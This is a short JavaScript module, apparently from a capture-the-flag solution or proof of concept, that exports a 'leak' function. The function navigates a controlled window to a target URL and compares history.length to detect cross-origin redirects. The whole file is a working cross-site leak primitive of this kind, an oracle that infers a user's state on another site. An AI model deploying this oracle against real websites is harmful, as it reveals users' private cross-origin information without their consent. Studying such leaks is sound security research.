const leak = async (url) => {
    return new Promise(async (r) =>  {
        await switchToBlank(window.WW)

        let h1 = window.WW.history.length
        window.WW.location = url
        // wait for redirect
        await sleep(2500)
        await switchToBlank(window.WW)
        
        console.debug(window.WW.history.length, h1)
        if(window.WW.history.length - h1 === 3){
            return r(1)
        }else{
            return r(0)
        }
    })
    
}

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}


const switchToBlank = async (w) => {
    w.location = 'blank.html';
    while(1){
        try{
            if(w.history.length){
                await sleep(300)
                return 1
            }
        }
        catch(e){}
        await sleep(50)
    }
}

export { leak }